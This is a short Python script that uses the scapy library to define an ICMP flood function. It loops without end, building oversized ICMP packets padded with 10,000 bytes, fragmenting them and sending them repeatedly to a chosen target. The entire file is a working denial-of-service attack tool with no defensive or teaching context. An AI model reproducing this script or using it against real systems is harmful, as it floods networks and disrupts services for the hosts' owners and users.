from scapy.all import *

def icmp_flood(target):
   while True:
      for x in range(1, 100000):
         ip = IP(dst = target)
         tcp = ICMP()
         data = 'z'*10000
         packet = ip/tcp/data
         send(fragment(packet), loop=1)